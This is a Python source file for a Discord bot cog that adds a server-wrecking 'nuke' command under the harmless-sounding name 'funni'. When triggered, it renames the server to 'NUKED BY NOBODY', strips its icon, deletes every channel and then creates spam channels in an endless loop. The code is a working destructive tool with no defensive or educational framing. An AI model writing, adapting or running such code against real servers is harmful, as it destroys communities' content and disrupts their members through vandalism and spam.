from discord.ext import commands
import asyncio
from threading import Thread
from colorama import Fore



async def channel_spam(ctx):
	while 1:
		try:
			await ctx.guild.create_text_channel("𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐍𝐎𝐁𝐎𝐃𝐘")
			print(f"{Fore.LIGHTGREEN_EX}[+] Channel created")
		except:
			print(f"{Fore.RED}[-] Channel cannot be created")

def channel_spam1(ctx):asyncio.run(channel_spam(ctx))


class nukeMain(commands.Cog):
	def __init__(self,client):
		self.client=client
		
	@commands.command(name='funni')
	async def nuke(self,ctx: commands.Context):
		
		await ctx.message.delete()
		await ctx.guild.edit(
			name = "𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐍𝐎𝐁𝐎𝐃𝐘",
			icon = None
		)
		
		for a in ctx.guild.channels:
			try:
				await a.delete()
				print(f"{Fore.LIGHTGREEN_EX}[+] Channel deleted")
			except:
				print(f"{Fore.RED}[-] Channel cannot be deleted")
		print(f"{Fore.MAGENTA}[=] Server cleared")
		while 1:
			try:
				await ctx.guild.create_text_channel("𝐍𝐔𝐊𝐄𝐃 𝐁𝐘 𝐍𝐎𝐁𝐎𝐃𝐘")
				print(f"{Fore.LIGHTGREEN_EX}[+] Channel created")
			except:
				print(f"{Fore.RED}[-] Channel cannot be created")

		Thread(target=channel_spam1, args=(ctx,)).start()
	


async def setup(client):
	await client.add_cog(nukeMain(client))